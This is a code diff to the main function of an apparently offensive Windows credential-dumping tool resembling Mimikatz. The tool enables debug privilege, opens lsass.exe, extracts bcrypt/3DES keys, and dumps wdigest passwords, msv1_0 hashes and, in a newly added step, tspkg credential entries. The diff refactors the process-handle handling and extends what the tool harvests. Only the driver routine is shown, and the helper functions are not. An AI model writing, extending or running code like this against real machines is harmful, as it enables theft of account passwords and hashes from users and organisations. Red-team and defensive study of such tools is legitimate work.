@@ -11,27 +11,17 @@ int wmain(int argc, LPCWSTR argv[])
 	MESSAGE(L"[*] Enable debug privilege\r\n");
 	RETN_IF(!EnableDebugPrivilege(), L"EnableDebugPrivilege", -1);
 	MESSAGE(L"[*] Open process lsass.exe\r\n");
-	DWORD  dwLsassProcId = 0;
-	HANDLE hLsassProc = OpenProcessByName(L"lsass.exe", &dwLsassProcId);
-	RETN_IF(hLsassProc == NULL, L"OpenProcessByName", -1);
-	MESSAGE(L"Open lsass.exe successfully, PID=%d\r\n", dwLsassProcId);
+	RETN_MSG_IF(!OpenLsass(), -1, L"Cant open process Lsass.exe\r\n");
 	MESSAGE(L"[*] Dump 3deskey and iv\r\n");
-	DWORD         cbIV = 8;
-	BYTE          szIV[8] = { 0 };
-	KIWI_HARD_KEY sz3DesKey = { 0 };
-	FindH3DesKey(hLsassProc, &sz3DesKey, (LPBYTE)&szIV, &cbIV);
-
-	MESSAGE(L"3DES Key => Size:%x, Key array: ", sz3DesKey.cbSecret);
-	HexDump((LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, FALSE);
-
-	MESSAGE(L"3DES IV  => IV array: ");
-	HexDump(szIV, cbIV, FALSE);
+	FindBcryptKeys();
 	MESSAGE(L"[*] Dump wdigest password entries\r\n");
-	Wdigest_LogSessList_Dump(hLsassProc, (LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, szIV, cbIV);
+	Wdigest_LogSessList_Dump();
 	MESSAGE(L"[*] Dump msv1_0 hash entries\r\n");
-	Msv1_0_LogonSessList_Dump(hLsassProc, (LPBYTE)&sz3DesKey.data, sz3DesKey.cbSecret, szIV, cbIV);
-
-	CloseHandle(hLsassProc);
+	Msv1_0_LogonSessList_Dump();
+	MESSAGE(L"[*] Dump tspkg password entries\r\n");
+	Tspkg_TSGlobalCredTable_Dump();
+	CloseLsass();
+	
 	return 0;
 }
 /*
